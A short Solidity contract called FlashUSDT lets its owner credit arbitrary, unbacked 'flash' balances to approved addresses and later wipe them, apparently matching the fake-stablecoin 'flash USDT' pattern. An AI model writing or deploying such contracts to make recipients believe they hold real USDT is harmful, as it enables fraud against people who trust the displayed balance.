// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FlashUSDT {
    address public owner;
    mapping(address => bool) public allowedUsers;
    mapping(address => uint256) public flashBalances;

    event FlashTransfer(address indexed to, uint256 amount);
    event FlashRevoke(address indexed to);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    function approveUser(address user) external onlyOwner {
        allowedUsers[user] = true;
    }

    function flashTransfer(address to, uint256 amount) external onlyOwner {
        require(allowedUsers[to], "Not approved");
        flashBalances[to] += amount;
        emit FlashTransfer(to, amount);
    }

    function revokeFlash(address to) external onlyOwner {
        flashBalances[to] = 0;
        emit FlashRevoke(to);
    }

    function getFlashBalance(address user) external view returns (uint256) {
        return flashBalances[user];
    }
}